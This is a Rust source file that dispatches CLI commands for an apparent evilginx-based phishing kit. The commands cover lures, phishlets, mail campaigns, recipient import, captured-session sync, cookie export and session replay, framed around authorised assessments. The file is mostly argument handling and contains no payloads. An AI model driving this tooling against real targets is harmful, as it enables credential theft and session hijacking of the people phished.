//! phishkit — headless control plane. Mirrors the desktop Tauri invoke
//! handlers so the full funnel (assessment → target → lure → mail → campaign →
//! results → sessions) can be scripted for end-to-end automation.
use serde_json::{json, Value};

use crate::db;
use crate::destination;
use crate::engagement::resolve_engagement;
use crate::error::{AppError, AppResult};
use crate::evilginx_ctl;
use crate::hosts;
use crate::kit::kit_info;
use crate::logs;
use crate::phishlet;
use crate::recon;
use crate::services;
use crate::sessions;
use crate::{assessment, aup, campaign, community, firebase, lure_ops, mail, readiness, setup};

/// Plain help text (no ANSI). Prefer [`render_help`] for interactive terminals.
pub fn help_plain() -> String {
    crate::cli_help::help_plain()
}

/// Colored or plain help for interactive use.
pub fn render_help(color: bool) -> String {
    crate::cli_help::render_help(color)
}

/// Whether stderr should use ANSI colors.
pub fn want_color() -> bool {
    crate::cli_help::want_color()
}

fn arg_val(args: &[String], flags: &[&str]) -> Option<String> {
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        for flag in flags {
            if a == *flag {
                return args.get(i + 1).cloned();
            }
            let prefix = format!("{flag}=");
            if let Some(rest) = a.strip_prefix(&prefix) {
                return Some(rest.to_string());
            }
        }
        i += 1;
    }
    None
}

fn require_arg(args: &[String], flags: &[&str]) -> AppResult<String> {
    arg_val(args, flags).ok_or_else(|| AppError::msg(format!("missing {}", flags.join("/"))))
}

fn flag(args: &[String], names: &[&str]) -> bool {
    args.iter().any(|a| names.iter().any(|n| a == *n))
}

/// Read a flag's value, treating a leading `@` as a file path to slurp.
fn read_arg(args: &[String], flags: &[&str]) -> AppResult<String> {
    let v = require_arg(args, flags)?;
    if let Some(path) = v.strip_prefix('@') {
        std::fs::read_to_string(path).map_err(|e| AppError::msg(format!("read {path}: {e}")))
    } else {
        Ok(v)
    }
}

/// Deserialize the `--json` payload (inline JSON or `@file.json`) into a request.
fn parse_json<T: serde::de::DeserializeOwned>(args: &[String]) -> AppResult<T> {
    let raw = read_arg(args, &["-j", "--json"])?;
    serde_json::from_str(&raw).map_err(|e| AppError::msg(format!("invalid --json: {e}")))
}

fn opt_assessment(args: &[String]) -> Option<String> {
    arg_val(args, &["-a", "--assessment"]).filter(|s| !s.is_empty())
}

fn parse_bool(s: &str) -> AppResult<bool> {
    match s.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" => Ok(true),
        "0" | "false" | "no" | "off" => Ok(false),
        other => Err(AppError::msg(format!("invalid bool: {other}"))),
    }
}

fn ensure_destination(args: &[String]) -> AppResult<Value> {
    let target = require_arg(args, &["-t", "--target"])?;
    let name = arg_val(args, &["-n", "--name"]);
    let force = flag(args, &["-F", "--force-scaffold"]);
    let assessment_id = opt_assessment(args);
    let r = destination::ensure_destination(target, name, force, assessment_id)?;
    Ok(json!({
        "step": "1-2",
        "detect": r.detect,
        "phishlet": r.phishlet,
        "profile": r.profile,
        "firebase_hooks": r.firebase_hooks,
        "message": r.message,
    }))
}

pub fn run(cmd: &str, args: &[String]) -> AppResult<Value> {
    match cmd {
        // —— Setup / paths ——
        "setup-get" => Ok(serde_json::to_value(setup::load_setup()?)?),
        "setup-complete" => {
            let cfg: setup::SetupConfig = parse_json(args)?;
            Ok(serde_json::to_value(setup::complete_setup(cfg)?)?)
        }
        "tutorial-complete" => {
            let done = parse_bool(&require_arg(args, &["-D", "--done"])?)?;
            Ok(serde_json::to_value(setup::set_tutorial_completed(done)?)?)
        }
        "paths" => Ok(serde_json::to_value(setup::paths_info()?)?),

        // —— Recon / proxy ——
        "kit-info" => Ok(serde_json::to_value(kit_info()?)?),
        "service-status" => Ok(serde_json::to_value(services::service_status()?)?),
        "build" => Ok(json!({ "message": services::build_binaries()? })),
        "detect" => {
            let url = require_arg(args, &["-u", "--url"])?;
            Ok(serde_json::to_value(recon::detect_target(&url)?)?)
        }
        "resolve" => {
            let target = require_arg(args, &["-t", "--target"])?;
            let dryrun = arg_val(args, &["-d", "--dryrun"]);
            let phishlet = arg_val(args, &["-P", "--phishlet"]);
            Ok(serde_json::to_value(resolve_engagement(
                Some(target),
                dryrun,
                phishlet,
            )?)?)
        }
        "ensure-destination" => ensure_destination(args),
        "scaffold" => {
            let target = require_arg(args, &["-t", "--target"])?;
            let template_id = require_arg(args, &["-T", "--template"])?;
            Ok(serde_json::to_value(phishlet::scaffold_from_pattern(
                &target,
                &template_id,
            )?)?)
        }
        "hosts-status" => {
            let dryrun = require_arg(args, &["-d", "--dryrun"])?;
            let phishlet = arg_val(args, &["-P", "--phishlet"]);
            Ok(serde_json::to_value(hosts::hosts_status(
                dryrun, phishlet,
            )?)?)
        }
        "hosts-fix" => {
            let dryrun = require_arg(args, &["-d", "--dryrun"])?;
            let phishlet = arg_val(args, &["-P", "--phishlet"]);
            Ok(serde_json::to_value(hosts::hosts_fix(dryrun, phishlet)?)?)
        }
        "hosts-remove" => {
            let dryrun = require_arg(args, &["-d", "--dryrun"])?;
            let phishlet = arg_val(args, &["-P", "--phishlet"]).unwrap_or_default();
            let fqdns = hosts::required_fqdns(&dryrun, &phishlet);
            Ok(hosts::remove_fqdns(fqdns)?)
        }
        "start-lure" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            let dryrun = require_arg(args, &["-d", "--dryrun"])?;
            let phishlet = require_arg(args, &["-P", "--phishlet"])?;
            Ok(serde_json::to_value(evilginx_ctl::start_with_lure(
                profile_id, dryrun, phishlet, None,
            )?)?)
        }
        "stop" => Ok(json!({ "message": evilginx_ctl::stop()? })),
        "list-redirectors" => Ok(serde_json::to_value(lure_ops::list_redirectors()?)?),
        "ca-trust" => Ok(serde_json::to_value(lure_ops::ca_trust_info()?)?),
        "open-ca-cert" => Ok(json!({ "path": lure_ops::open_ca_cert()? })),
        "tail-logs" => {
            let lines = arg_val(args, &["-l", "--lines"]).and_then(|s| s.parse().ok());
            Ok(json!({ "log": logs::tail_evilginx_log(lines)? }))
        }

        // —— Profiles / community ——
        "list-profiles" => Ok(serde_json::to_value(db::list_profiles()?)?),
        "get-profile" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(db::get_profile(&id)?)?)
        }
        "upsert-profile" => {
            let req: db::UpsertProfile = parse_json(args)?;
            Ok(serde_json::to_value(db::upsert_profile(req)?)?)
        }
        "activate-profile" => {
            let id = require_arg(args, &["-i", "--id"])?;
            db::set_active_profile(&id)?;
            Ok(json!({ "ok": true, "id": id }))
        }
        "delete-profile" => {
            let id = require_arg(args, &["-i", "--id"])?;
            db::delete_profile(&id)?;
            Ok(json!({ "ok": true }))
        }
        "sync-community" => Ok(serde_json::to_value(community::sync_community_phishlets()?)?),
        "list-community" => {
            let q = arg_val(args, &["-q", "--query"]);
            Ok(serde_json::to_value(community::list_community_phishlets(
                q,
            )?)?)
        }
        "import-community" => {
            let name = require_arg(args, &["-n", "--name"])?;
            Ok(serde_json::to_value(community::import_community_phishlet(
                name,
            )?)?)
        }
        "list-active-phishlets" => Ok(serde_json::to_value(community::list_active_phishlets()?)?),
        "get-phishlet" => {
            let name = require_arg(args, &["-n", "--name"])?;
            Ok(serde_json::to_value(phishlet::get_phishlet_yaml(name)?)?)
        }
        "save-phishlet" => {
            let name = require_arg(args, &["-n", "--name"])?;
            let yaml = read_arg(args, &["-y", "--yaml"])?;
            Ok(serde_json::to_value(phishlet::save_phishlet_yaml(
                name, yaml,
            )?)?)
        }
        "target-readiness" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(readiness::target_readiness(
                profile_id,
            )?)?)
        }

        // —— Assessments ——
        "list-assessments" => Ok(serde_json::to_value(assessment::list_assessments(flag(
            args,
            &["-A", "--all"],
        ))?)?),
        "get-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::get_assessment(&id)?)?)
        }
        "create-assessment" => {
            let req: assessment::CreateAssessment = parse_json(args)?;
            Ok(serde_json::to_value(assessment::create_assessment(req)?)?)
        }
        "update-assessment" => {
            let req: assessment::UpdateAssessment = parse_json(args)?;
            Ok(serde_json::to_value(assessment::update_assessment(req)?)?)
        }
        "set-active-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            assessment::set_active_assessment(&id)?;
            Ok(json!({ "ok": true, "id": id }))
        }
        "get-active-assessment" => Ok(serde_json::to_value(assessment::get_active_assessment()?)?),
        "archive-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::archive_assessment(&id)?)?)
        }
        "unarchive-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::unarchive_assessment(
                &id,
            )?)?)
        }
        "delete-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::delete_assessment(&id)?)?)
        }
        "clone-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::clone_assessment(&id)?)?)
        }
        "list-targets" => {
            let id = require_arg(args, &["-a", "--assessment"])?;
            Ok(serde_json::to_value(assessment::list_targets(&id)?)?)
        }
        "export-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            let redact = !flag(args, &["-N", "--no-redact"]);
            Ok(assessment::export_bundle(&id, redact)?)
        }
        "purge-assessment" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(assessment::purge_assessment_data(
                &id,
                flag(args, &["--sessions"]),
                flag(args, &["--attempts"]),
                flag(args, &["--pii"]),
            )?)?)
        }
        "assessment-hosts-cleanup" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(assessment::hosts_cleanup(&id)?)
        }

        // —— Lures ——
        "list-lures" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(lure_ops::list_lures(&profile_id)?)?)
        }
        "get-lure" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(lure_ops::get_lure(&id)?)?)
        }
        "get-default-lure" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(lure_ops::get_default_lure(
                &profile_id,
            )?)?)
        }
        "upsert-lure" => {
            let req: lure_ops::UpsertLure = parse_json(args)?;
            Ok(serde_json::to_value(lure_ops::upsert_lure(req)?)?)
        }
        "set-default-lure" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            let lure_id = require_arg(args, &["-U", "--lure-id"])?;
            Ok(serde_json::to_value(lure_ops::set_default_lure(
                &profile_id,
                &lure_id,
            )?)?)
        }
        "delete-lure" => {
            let id = require_arg(args, &["-i", "--id"])?;
            lure_ops::delete_lure(&id)?;
            Ok(json!({ "ok": true }))
        }

        // —— Mail / content ——
        "list-mail-accounts" => Ok(serde_json::to_value(mail::list_mail_accounts()?)?),
        "upsert-mail-account" => {
            let req: mail::UpsertMailAccount = parse_json(args)?;
            Ok(serde_json::to_value(mail::upsert_mail_account(req)?)?)
        }
        "activate-mail-account" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(mail::activate_mail_account(id)?)?)
        }
        "delete-mail-account" => {
            let id = require_arg(args, &["-i", "--id"])?;
            mail::delete_mail_account(id)?;
            Ok(json!({ "ok": true }))
        }
        "send-test" => {
            let to = require_arg(args, &["-e", "--to"])?;
            Ok(serde_json::to_value(mail::send_test(to)?)?)
        }
        "list-templates" => Ok(serde_json::to_value(mail::list_templates(
            opt_assessment(args),
        )?)?),
        "upsert-template" => {
            let req: mail::UpsertTemplate = parse_json(args)?;
            Ok(serde_json::to_value(mail::upsert_template(req)?)?)
        }
        "delete-template" => {
            let id = require_arg(args, &["-i", "--id"])?;
            mail::delete_template(id)?;
            Ok(json!({ "ok": true }))
        }
        "list-recipient-lists" => Ok(serde_json::to_value(mail::list_recipient_lists(
            opt_assessment(args),
        )?)?),
        "create-list" => {
            let name = require_arg(args, &["-n", "--name"])?;
            Ok(serde_json::to_value(mail::create_recipient_list(
                name,
                opt_assessment(args),
            )?)?)
        }
        "delete-list" => {
            let id = require_arg(args, &["-i", "--id"])?;
            mail::delete_recipient_list(id)?;
            Ok(json!({ "ok": true }))
        }
        "import-recipients" => {
            let list_id = require_arg(args, &["-L", "--list-id"])?;
            let csv = read_arg(args, &["-c", "--csv"])?;
            Ok(serde_json::to_value(mail::import_recipients_csv(
                list_id, csv,
            )?)?)
        }
        "list-recipients" => {
            let list_id = require_arg(args, &["-L", "--list-id"])?;
            Ok(serde_json::to_value(mail::list_recipients(list_id)?)?)
        }

        // —— Campaigns / results ——
        "list-campaigns" => Ok(serde_json::to_value(campaign::list_campaigns(
            opt_assessment(args),
        )?)?),
        "get-campaign" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::get_campaign(&id)?)?)
        }
        "create-campaign" => {
            let req: campaign::CreateCampaign = parse_json(args)?;
            Ok(serde_json::to_value(campaign::create_campaign(req)?)?)
        }
        "delete-campaign" => {
            let id = require_arg(args, &["-i", "--id"])?;
            campaign::delete_campaign(id)?;
            Ok(json!({ "ok": true }))
        }
        "campaign-review" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::campaign_review(id)?)?)
        }
        "send-campaign-test" => {
            let id = require_arg(args, &["-i", "--id"])?;
            let to = require_arg(args, &["-e", "--to"])?;
            Ok(serde_json::to_value(campaign::send_campaign_test(id, to)?)?)
        }
        "start-campaign" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::start_campaign(id)?)?)
        }
        "stop-campaign" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::stop_campaign(id)?)?)
        }
        "retry-failed" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::retry_failed(id)?)?)
        }
        "campaign-attempts" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::list_attempts(id)?)?)
        }
        "campaign-funnel" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::campaign_funnel(id)?)?)
        }
        "campaign-report" => {
            let id = require_arg(args, &["-i", "--id"])?;
            Ok(serde_json::to_value(campaign::campaign_report(id)?)?)
        }
        "export-campaign-report" => {
            let id = require_arg(args, &["-i", "--id"])?;
            let format = arg_val(args, &["-f", "--format"]).unwrap_or_else(|| "json".into());
            Ok(json!({ "report": campaign::export_campaign_report(id, format)? }))
        }
        "import-events" => {
            let id = require_arg(args, &["-i", "--id"])?;
            let raw = read_arg(args, &["-r", "--raw"])?;
            Ok(serde_json::to_value(campaign::import_delivery_events(
                id, raw,
            )?)?)
        }

        // —— Sessions ——
        "sync-captures" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(sessions::sync_captures(profile_id)?)?)
        }
        "list-captures" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(sessions::list_captures(profile_id)?)?)
        }
        "delete-capture" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            let sid: i64 = require_arg(args, &["-s", "--session-id"])?
                .parse()
                .map_err(|_| AppError::msg("--session-id must be an integer"))?;
            sessions::delete_capture(profile_id, sid)?;
            Ok(json!({ "ok": true }))
        }
        "prune-captures" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(sessions::prune_captures(profile_id)?)
        }
        "export-cookies" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            let sid: i64 = require_arg(args, &["-s", "--session-id"])?
                .parse()
                .map_err(|_| AppError::msg("--session-id must be an integer"))?;
            let format = arg_val(args, &["-f", "--format"]).unwrap_or_else(|| "json".into());
            Ok(json!({
                "cookies": sessions::export_capture_cookies(profile_id, sid, format)?
            }))
        }
        "attribute-captures" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            Ok(serde_json::to_value(campaign::attribute_captures(
                profile_id,
            )?)?)
        }
        "launch-replay" => {
            let profile_id = require_arg(args, &["-p", "--profile-id"])?;
            let sid: i64 = require_arg(args, &["-s", "--session-id"])?
                .parse()
                .map_err(|_| AppError::msg("--session-id must be an integer"))?;
            let api_key = require_arg(args, &["-k", "--api-key"])?;
            let profile =
                db::get_profile(&profile_id)?.ok_or_else(|| AppError::msg("profile not found"))?;
            let capture = sessions::list_captures(profile_id)?
                .into_iter()
                .find(|c| c.evilginx_session_id == sid)
                .map(|c| c.data)
                .ok_or_else(|| AppError::msg("capture not found"))?;
            Ok(serde_json::to_value(firebase::launch_session_replay(
                capture,
                api_key,
                profile.target_domain,
                profile.phishlet,
            )?)?)
        }

        // —— AUP ——
        "aup-status" => Ok(serde_json::to_value(aup::get_aup_status()?)?),
        "aup-accept" => Ok(serde_json::to_value(aup::accept_aup()?)?),

        // —— Wizards ——
        "wiz" | "wizard" => {
            let sub = args.first().map(|s| s.as_str()).unwrap_or("");
            let rest = if args.is_empty() { &[][..] } else { &args[1..] };
            crate::wiz::run(sub, rest)
        }

        "help" | "--help" | "-h" => Ok(json!({ "help": help_plain() })),
        other => Err(AppError::msg(format!(
            "unknown command: {other}\n\nRun `phishkit --help` for the full command list."
        ))),
    }
}
